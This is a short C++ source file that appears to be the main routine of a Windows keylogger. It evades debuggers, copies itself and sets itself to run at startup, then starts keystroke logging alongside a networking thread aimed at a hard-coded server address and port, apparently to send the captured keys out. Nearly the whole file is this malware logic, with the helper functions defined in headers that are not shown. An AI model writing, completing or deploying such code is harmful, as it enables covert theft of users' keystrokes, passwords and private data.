#define UNICODE
#include <Windows.h>
#include "cipher.hpp"
#include "behave.hpp"

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (IsDebuggerPresent())
    {
        return -1;
    }

    std::string p = cpSelf();
    if (p != "")
    {
        autoStart(p);
    }

    /**
     * Server infos
    */
    ServerInfo sInfo;
    sInfo.ServerIp = "172.25.23.160";
    sInfo.Port = 1234;

    HANDLE behaves[BEHAVES_COUNT]; 
    behaves[0] = startKeyLogging();
    behaves[1] = startNetworking(&sInfo);

    WaitForMultipleObjects(BEHAVES_COUNT, behaves, TRUE, INFINITE);

    std::cout << "keylogRet" << std::endl;
    return 0;
}